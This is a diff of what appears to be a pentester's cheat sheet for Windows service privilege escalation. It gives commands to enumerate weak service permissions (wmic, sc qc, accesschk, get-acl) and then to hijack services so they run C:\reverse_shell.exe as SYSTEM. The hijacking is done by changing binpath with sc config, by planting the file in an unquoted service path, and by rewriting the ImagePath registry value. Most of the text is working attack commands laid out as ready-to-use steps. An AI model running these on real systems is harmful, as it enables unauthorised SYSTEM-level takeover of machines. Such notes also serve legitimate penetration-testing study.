@@ -1,9 +1,14 @@
+# Find non default services
+    wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
+
+
 # Get service informatoin(about permission included)
     sc qc <service_name>
 
+
 ## Service need be runned with SYSTEM rights
     SERVICE_START_NAME : LocalSystem
-______________________________________________________________________________
+____________________________________________________________________________
 
 
 # Check <username> permisson on <service_name>
@@ -13,18 +18,22 @@ ______________________________________________________________________________
 
 ## Modify the service config and set the BINARY_PATH_NAME
     sc config daclsvc binpath= "\"C:\reverse_shell.exe\""
-______________________________________________________________________________
+____________________________________________________________________________
 
 
 # Check currend user permisson on <service_foldef_path>
     accesschk.exe /accepteula -uwdq
 "C:\<service_foldef_path>\<bin_folder_name>\"
 
+#    or
+
+    powershell "get-acl -Path 'C:\<service_foldef_path>' | format-list"
+
 ## Service bin_folder_name is unquoted and contains spaces.
 
 ## Copy reverse shell to bin service folder name (or first part of folder name)
     copy C:\reverse_shell.exe "C:\<service_folder_path>\<bin_folder_name>.exe"
-______________________________________________________________________________
+____________________________________________________________________________
 
 
 # Check current user permisson on <service_name_registry>
@@ -36,7 +45,7 @@ ______________________________________________________________________________
 
 ## Change registry bin to reverse shell
     reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\reverse_shell.exe /f
-______________________________________________________________________________
+____________________________________________________________________________
 
 
 # Check current user permisson on <service_bin>
